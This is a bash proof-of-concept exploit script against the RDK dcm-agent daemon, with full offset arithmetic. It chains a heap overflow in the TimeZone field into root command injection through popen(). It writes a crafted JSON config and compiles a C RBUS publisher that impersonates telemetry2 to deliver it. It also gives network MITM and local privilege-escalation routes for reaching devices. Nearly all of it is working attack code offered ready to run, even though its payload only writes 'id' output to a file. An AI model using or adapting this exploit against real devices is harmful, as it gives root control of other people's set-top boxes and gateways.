#!/bin/bash
###############################################################################
# DCM-004 PoC : Heap overflow cTimeZone[16] -> cRdkPath[80] -> root popen() RCE
#
# Target  : dcmd (RDK dcm-agent), runs as root, umask(0)
# CWE     : CWE-122 (heap overflow) chained into CWE-78 (OS command injection)
# Sources : dcm_parseconf.c:224, dcm_parseconf.h:51-60, dcm.c:107-113,
#           dcm_utils.c:96, dcm_rbus.h:32-38
#
# ---------------------------------------------------------------------------
#  STRUCT LAYOUT (dcm_parseconf.h, all INT8 == char, so NO padding between):
#
#      typedef struct _dcmSettingsHandle {
#          INT8  cJsonStr[2048];     // off    0
#          INT8  cUploadURL[128];    // off 2048
#          INT8  cUploadPrtl[8];     // off 2176
#          INT8  cTimeZone[16];      // off 2184  <-- strcpy() DESTINATION
#          INT8  cRdkPath[80];       // off 2200  <-- OVERFLOW TARGET (popen sink)
#          INT8  ctBuff[1024];
#          INT32 bRebootFlag;
#      } DCMSettingsHandle;
#
#  OVERFLOW (dcm_parseconf.c:222-225, called for "urn:settings:TimeZoneMode"):
#
#      else if(cJSON_IsString(pJsonItem)) {
#          *type = DCM_JSONITEM_STR;
#          strcpy(sval, pJsonItem->valuestring);   // sval == &cTimeZone[0]
#      }
#
#  TimeZone is parsed AFTER UploadProtocol/UploadURL (dcm_parseconf.c:532-556)
#  and NOTHING re-initialises cRdkPath afterwards, so our bytes persist.
#
#  SINK (dcm.c:107-113, fires on DCM_FW_UPDATE cron schedule):
#
#      INT8 *pRDKPath = dcmSettingsGetRDKPath(...);   // -> &cRdkPath[0]
#      snprintf(pExecBuff, 1024,
#               "/bin/sh %s/swupdate_utility.sh 0 2 >> /opt/logs/swupdate.log 2>&1",
#               pRDKPath);
#      dcmUtilsSysCmdExec(pExecBuff);                 // -> popen(cmd,"r") AS ROOT
#
# ---------------------------------------------------------------------------
#  OFFSET / PAYLOAD MATH
#
#   bytes [ 0 .. 15]  ->  cTimeZone[0..15]   : 16-byte filler  ("AAAAAAAAAAAAAAAA")
#   bytes [16 .. 43]  ->  cRdkPath[0..27]    : "/tmp;id>/tmp/PWNED_DCM-004;#"
#   byte  [44]        ->  cRdkPath[28] = NUL : strcpy terminator
#
#   Total written into cRdkPath = 29 bytes (well inside the 80-byte field, so
#   we do NOT spill into ctBuff -- this is a *controlled adjacent overwrite*,
#   not a wild smash, hence no heap-corruption crash before the sink fires).
#
#   Resulting popen() argument:
#
#     /bin/sh /tmp;id>/tmp/PWNED_DCM-004;#/swupdate_utility.sh 0 2 >> /opt/logs/swupdate.log 2>&1
#               ^^^^                      ^---- '#' comments out the tail
#     popen wraps in `/bin/sh -c "..."`, which executes:
#       1) /bin/sh /tmp                -> harmless error ("Is a directory")
#       2) id > /tmp/PWNED_DCM-004     -> PROOF OF ROOT RCE
#       3) #...                        -> comment, ignored
#
# ---------------------------------------------------------------------------
#  TRIGGER CHAIN
#   1. Write single-line JSON (must be one line: dcmSettingJsonInit uses fgets
#      with a 2048-byte cap; payload below is ~360 bytes).
#   2. Publish RBUS Device.DCM.Setconfig  {dcmSetConfig:"<json path>"}
#   3. Publish RBUS Device.DCM.Processconfig  -> dcmd parses JSON -> overflow
#   4. Same JSON sets "urn:settings:CheckSchedule:cron":"* * * * *" so the
#      DCM_FW_UPDATE scheduler fires within <=60s -> dcmRunJobs() -> popen().
#
#  PRECONDITION: /etc/device.properties must NOT contain "ENABLE_MAINTENANCE"
#  (else dcmRunJobs() returns early at dcm.c:59-62).  Most non-MaintenanceMgr
#  RDK-V profiles satisfy this.
###############################################################################

set -u

EVIL_JSON="/tmp/dcm004_evil.json"
PROOF="/tmp/PWNED_DCM-004"
HELPER_SRC="/tmp/dcm004_pub.c"
HELPER_BIN="/tmp/dcm004_pub"

rm -f "${PROOF}"

# ---------------------------------------------------------------------------
# STEP 1 -- craft the malicious XCONF/DCM JSON response (single line!)
# ---------------------------------------------------------------------------
PAD16='AAAAAAAAAAAAAAAA'                          # exactly 16 bytes -> fills cTimeZone[16]
INJECT='/tmp;id>/tmp/PWNED_DCM-004;#'             # 28 bytes -> lands at cRdkPath[0]
TZ_PAYLOAD="${PAD16}${INJECT}"                    # 44 bytes + NUL written by strcpy()

#  - UploadRepository:URL points at a closed local port so the incidental
#    uploadstblogs_run() side-effect fails fast and harmlessly.
#  - UploadSchedule:cron is far-future so the LOG_UPLOAD job never fires.
#  - CheckSchedule:cron is "* * * * *" so DCM_FW_UPDATE (the popen sink) fires
#    at the top of the next minute.
printf '%s' \
'{"urn:settings:LogUploadSettings:UploadRepository:uploadProtocol":"HTTP",'\
'"urn:settings:LogUploadSettings:UploadRepository:URL":"http://127.0.0.1:1/",'\
'"urn:settings:TimeZoneMode":"'"${TZ_PAYLOAD}"'",'\
'"urn:settings:LogUploadSettings:UploadOnReboot":false,'\
'"urn:settings:LogUploadSettings:UploadSchedule:cron":"0 0 1 1 *",'\
'"urn:settings:CheckSchedule:cron":"* * * * *"}' > "${EVIL_JSON}"

echo "[*] Malicious DCM JSON written to ${EVIL_JSON} ($(wc -c < "${EVIL_JSON}") bytes):"
cat "${EVIL_JSON}"; echo; echo

# Sanity-check padding length
if [ "${#PAD16}" -ne 16 ]; then
    echo "[-] INTERNAL ERROR: PAD16 is ${#PAD16} bytes, expected 16"; exit 1
fi

# ---------------------------------------------------------------------------
# STEP 2 -- build a tiny RBUS publisher (rbuscli cannot set the inner property
#           key 'dcmSetConfig' that dcm_rbus.c:88 expects, so we need C).
# ---------------------------------------------------------------------------
cat > "${HELPER_SRC}" <<'EOF'
/*
 * DCM-004 RBUS event publisher.
 * Stands in for telemetry2: registers Device.DCM.Setconfig /
 * Device.DCM.Processconfig as provider, waits for dcmd's async subscribe
 * to bind, then publishes both events so dcmd parses our malicious JSON.
 *
 * If telemetry2 already owns these events, registration returns DUPLICATE;
 * stop it first:  systemctl stop telemetry2_0   (or kill `pidof telemetry2_0`)
 */
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#if __has_include(<rbus/rbus.h>)
#  include <rbus/rbus.h>
#else
#  include <rbus.h>
#endif

#define EV_SET   "Device.DCM.Setconfig"      /* DCM_RBUS_SETCONF_EVENT  */
#define EV_PROC  "Device.DCM.Processconfig"  /* DCM_RBUS_PROCCONF_EVENT */
#define KEY_PATH "dcmSetConfig"              /* DCM_SET_CONFIG          */

static rbusError_t subCB(rbusHandle_t h, rbusEventSubAction_t a,
                         const char *n, rbusFilter_t f,
                         int32_t i, bool *ap)
{ (void)h;(void)f;(void)i;(void)ap;
  fprintf(stderr,"[helper] dcmd %s %s\n",
          a==RBUS_EVENT_ACTION_SUBSCRIBE?"subscribed-to":"unsubscribed-from", n);
  return RBUS_ERROR_SUCCESS; }

static int pub(rbusHandle_t h, const char *evt, const char *key, const char *val)
{
    rbusValue_t v; rbusObject_t d; rbusEvent_t e; int rc;
    memset(&e, 0, sizeof(e));
    rbusValue_Init(&v);  rbusValue_SetString(v, val);
    rbusObject_Init(&d, NULL); rbusObject_SetValue(d, key, v);
    e.name = evt; e.data = d; e.type = RBUS_EVENT_GENERAL;
    rc = rbusEvent_Publish(h, &e);
    fprintf(stderr,"[helper] publish %s rc=%d\n", evt, rc);
    rbusValue_Release(v); rbusObject_Release(d);
    return rc;
}

int main(int argc, char **argv)
{
    rbusHandle_t h; int rc;
    if (argc < 2) { fprintf(stderr,"usage: %s <json_path>\n",argv[0]); return 1; }

    if ((rc = rbus_open(&h, "DCM004_PoC")) != RBUS_ERROR_SUCCESS) {
        fprintf(stderr,"[-] rbus_open rc=%d (is rtrouted running?)\n", rc);
        return 1;
    }

    rbusDataElement_t el[2] = {
        { EV_SET,  RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subCB,NULL} },
        { EV_PROC, RBUS_ELEMENT_TYPE_EVENT, {NULL,NULL,NULL,NULL,subCB,NULL} },
    };
    rc = rbus_regDataElements(h, 2, el);
    if (rc != RBUS_ERROR_SUCCESS)
        fprintf(stderr,"[!] regDataElements rc=%d -- telemetry2 likely owns these "
                       "events already.  Stop it and retry.\n", rc);

    /* Give dcmd's rbusEvent_SubscribeAsync time to (re)bind to us */
    fprintf(stderr,"[helper] waiting 5s for dcmd subscription...\n");
    sleep(5);

    pub(h, EV_SET,  KEY_PATH, argv[1]);   /* sets confPath in dcmd          */
    sleep(1);
    pub(h, EV_PROC, "trigger", "go");     /* sets schedJob=1 -> parse fires */

    /* dcmd polls schedJob every 1s; give it a moment, then we can exit --
       the FW-update cron is internal to dcmd and survives our exit. */
    sleep(3);
    rbus_unregDataElements(h, 2, el);
    rbus_close(h);
    return 0;
}
EOF

echo "[*] Compiling RBUS helper..."
CFLAGS="$(pkg-config --cflags rbus 2>/dev/null)"
LIBS="$(pkg-config --libs   rbus 2>/dev/null)"
[ -z "${LIBS}" ] && LIBS="-lrbus"
if gcc ${CFLAGS} -o "${HELPER_BIN}" "${HELPER_SRC}" ${LIBS} 2>/tmp/dcm004_cc.log; then
    echo "[+] Helper built: ${HELPER_BIN}"
    HAVE_RBUS=1
else
    echo "[!] Could not build RBUS helper (see /tmp/dcm004_cc.log)."
    echo "[!] Falling back to OFF-DEVICE / MITM mode -- see instructions below."
    HAVE_RBUS=0
fi

# ---------------------------------------------------------------------------
# STEP 3 -- deliver payload
# ---------------------------------------------------------------------------
if [ "${HAVE_RBUS}" -eq 1 ]; then
    if grep -q '^ENABLE_MAINTENANCE' /etc/device.properties 2>/dev/null; then
        echo "[!] WARNING: ENABLE_MAINTENANCE present in /etc/device.properties --"
        echo "             dcmRunJobs() will early-return and the popen() sink is"
        echo "             unreachable on this build (dcm.c:59-62)."
    fi
    if pidof telemetry2_0 >/dev/null 2>&1; then
        echo "[!] WARNING: telemetry2_0 is running and owns the target RBUS events."
        echo "             Run 'systemctl stop telemetry2_0' (or kill it) and retry."
    fi

    echo "[*] Publishing malicious config to dcmd via RBUS..."
    "${HELPER_BIN}" "${EVIL_JSON}"

    echo "[*] Overflow delivered.  dcmd has now scheduled DCM_FW_UPDATE with"
    echo "    cron '* * * * *'.  Waiting up to 90s for the scheduler to fire"
    echo "    dcmRunJobs() -> popen() ..."
    for i in $(seq 1 90); do
        if [ -f "${PROOF}" ]; then
            echo
            echo "=========================================================="
            echo "[+] EXPLOIT REACHED -- root command injection confirmed"
            echo "=========================================================="
            echo "[+] ${PROOF} contents (output of 'id' run by dcmd as root):"
            cat  "${PROOF}"
            echo "[+] popen() executed:"
            echo "    /bin/sh /tmp;id>/tmp/PWNED_DCM-004;#/swupdate_utility.sh 0 2 >> ..."
            exit 0
        fi
        sleep 1
        printf '.'
    done
    echo
    echo "[-] Timed out.  Check: dcmd running as root?  ENABLE_MAINTENANCE unset?"
    echo "    telemetry2 stopped?  See /opt/logs/dcm*.log for parser output --"
    echo "    look for 'TimeZone : AAAAAAAAAAAAAAAA/tmp;id>...' which proves the"
    echo "    overflow itself landed even if the cron has not yet fired."
    exit 1
fi

# ---------------------------------------------------------------------------
# OFF-DEVICE FALLBACK -- no rbus toolchain on this host.
# ---------------------------------------------------------------------------
cat <<EOF2

================  OFF-DEVICE / NETWORK-MITM USAGE  ====================
The malicious JSON has been written to:
    ${EVIL_JSON}

Deliver it to the target via either route:

(a) NETWORK MITM of the XCONF DCM settings fetch (primary remote vector):
    Serve the file above as the HTTP(S) response body to the device's
    DCM/Telemetry config request (URL from
    Device.DeviceInfo.X_RDKCENTRAL-COM_RFC.Feature.Telemetry.ConfigURL).
    telemetry2 will write it to disk and publish Device.DCM.Setconfig /
    Device.DCM.Processconfig for you.

(b) ON-DEVICE LOCAL PRIVESC:
    scp this script + ${EVIL_JSON} to the device, ensure gcc + librbus-dev
    are present, stop telemetry2_0, and re-run this script there.

After delivery, within <=60s look for ${PROOF} on the target -- it will
contain the output of 'id' executed as root by dcmd's popen().
=======================================================================
EOF2
exit 0

